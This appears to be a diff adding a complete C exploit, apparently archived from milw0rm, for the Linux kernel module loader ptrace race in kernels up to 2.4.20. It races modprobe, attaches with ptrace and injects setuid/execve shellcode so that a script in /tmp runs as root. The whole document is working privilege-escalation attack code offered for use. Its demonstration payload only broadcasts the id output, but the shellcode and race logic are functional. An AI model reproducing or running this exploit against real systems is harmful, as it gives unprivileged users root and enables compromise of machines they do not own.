@@ -1,0 +1,203 @@
+/***********************************************
+*					         
+*       Linux Kernel Module Loader Local R00t Exploit	 
+*	              Up to 2.4.20			
+*	        By anonymous KuRaK			
+*						
+************************************************
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/time.h>
+#include <linux/user.h>
+
+
+
+#define TMPSIZE 4096
+#define FMAX 768
+#define UIDNUM 6
+#define MMSIZE (4096*1)
+#define MAXSTACK 0xc0000000
+
+//      where to put the root script
+#define SHELL "/tmp/w00w00w"
+
+//      what to open to run modprobe
+#define ENTRY "/dev/dsp3"
+
+
+struct uids {
+    unsigned uid;
+    unsigned euid;
+    unsigned suid;
+    unsigned fsuid;
+};
+
+
+//      thanks to the epcs2.c code :-))
+char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x31\xc0\x31\
+xdb\xb0\x17\xcd\x80"	/* setuid(0) */
+    "\x31\xc0\xb0\x2e\xcd\x80" "\x31\xc0\x50\xeb\x17\x8b\x1c\x24"	
+/* execve(SHELL) */
+    "\x90\x90\x90\x89\xe1\x8d\x54\x24"	/* lets be tricky */
+    "\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
+    "\xc3\x40\xcd\x80\xe8\xe4\xff\xff" "\xff" SHELL "\x00\x00\x00\x00";
+
+
+//      payload...
+char *shellcmd = "#!/bin/sh\nid|wall\necho \"Your kernel is buggy\"|wall";
+
+
+volatile int sig = 0;
+volatile struct user_regs_struct regs;
+
+
+void sighnd(int v)
+{
+    sig++;
+}
+
+
+void fatal(const char *msg)
+{
+    printf("\n");
+    if (!errno) {
+	fprintf(stderr, "FATAL ERROR: %s\n", msg);
+    } else {
+	perror(msg);
+    }
+    printf("\n");
+    fflush(stdout);
+    fflush(stderr);
+    exit(129);
+}
+
+
+void exploit(int pid)
+{
+    int i;
+
+    if (ptrace(PTRACE_GETREGS, pid, 0, &regs))
+	fatal("ptrace: PTRACE_GETREGS");
+    for (i = 0; i <= sizeof(shellcode); i += 4) {
+	if (ptrace
+	    (PTRACE_POKETEXT, pid, regs.eip + i, *(int *) (shellcode + i)))
+	    fatal("ptrace: PTRACE_POKETEXT");
+    }
+    if (ptrace(PTRACE_SETREGS, pid, 0, &regs))
+	fatal("ptrace: PTRACE_SETREGS");
+    ptrace(PTRACE_DETACH, pid, 0, 0);
+    kill(pid, SIGCONT);
+}
+
+
+int get_ids(FILE * fp, struct uids *uids)
+{
+    int i;
+    char tmp[TMPSIZE];
+
+
+    fseek(fp, 0, SEEK_SET);
+    for (i = 0; i < UIDNUM; i++)
+	fgets(tmp, sizeof(tmp), fp);
+    return fscanf(fp, "Uid: %u %u %u %u", &uids->uid, &uids->euid,
+		  &uids->suid, &uids->fsuid);
+}
+
+
+int main(int ac, char **av)
+{
+    int fd, pid, p, i;
+    char buf[TMPSIZE];
+    struct uids uids;
+    FILE *fp;
+
+
+    setpgrp();
+    setsid();
+    umask(022);
+    unlink(SHELL);
+    fd = open(SHELL, O_RDWR | O_CREAT | O_TRUNC, 0755);
+    fp = fdopen(fd, "w+");
+    fprintf(fp, "%s\n", shellcmd);
+    fclose(fp);
+
+    pid = getpid() + 2;
+    snprintf(buf, sizeof(buf) - 1, "/proc/%d/status", pid);
+    printf("\nModprobe pid %d, my pid %d", pid, getpid());
+    fflush(stdout);
+    signal(SIGUSR1, sighnd);
+
+//      fork modprobe helper
+    if (!(p = fork())) {
+//      some nice work for exec_usermodehelper(), keep it busy!
+	for (i = 0; i < FMAX; i++) {
+	    fd = open("/dev/zero", O_RDWR);
+	    mmap(NULL, MMSIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	}
+	kill(getppid(), SIGUSR1);
+	while (!sig);
+	printf("\nHelper (pid %d) requesting module...", getpid());
+	fflush(stdout);
+	fd = open(ENTRY, O_RDONLY | O_NONBLOCK);
+	exit(0);
+    }
+//      synchronize with the child
+    else {
+	while (!sig);
+	kill(p, SIGUSR1);
+
+//      wait for modprobe to run at unprivileged level
+	while (1) {
+	    fd = open(buf, O_RDONLY);
+	    if (fd > 0) {
+		if (!(fp = fdopen(fd, "r")))
+		    fatal("fdopen");
+		if (get_ids(fp, &uids) != 4
+		    || (uids.uid != uids.euid || uids.uid != uids.suid
+			|| uids.uid != uids.fsuid)) {
+		    fatal("did not catch modprobe...try again later :-)");
+		}
+//      ok, it runs...
+		while (1) {
+		    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
+			fatal("PTRACE_ATTACH failed!");
+		    } else {
+			i = 0;
+			printf("\nAttached afterburner...\n");
+			fflush(stdout);
+			while (ptrace(PTRACE_GETREGS, pid, 0, &regs)
+			       || !regs.eip || regs.eip >= MAXSTACK) {
+			    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
+			    printf("\rplease wait %d", i++);
+			    fflush(stdout);
+			}
+			waitpid(pid, NULL, WUNTRACED);
+			printf
+			    ("\nValid EIP found EIP=%p\nexploiting the bug, good luck... ",
+			     regs.eip);
+			fflush(stdout);
+			exploit(pid);
+			exit(0);
+		    }
+		}
+		fclose(fp);
+	    }
+	}
+    }
+
+    return 0;
+}
+
+
+
+// milw0rm.com [2003-04-14]
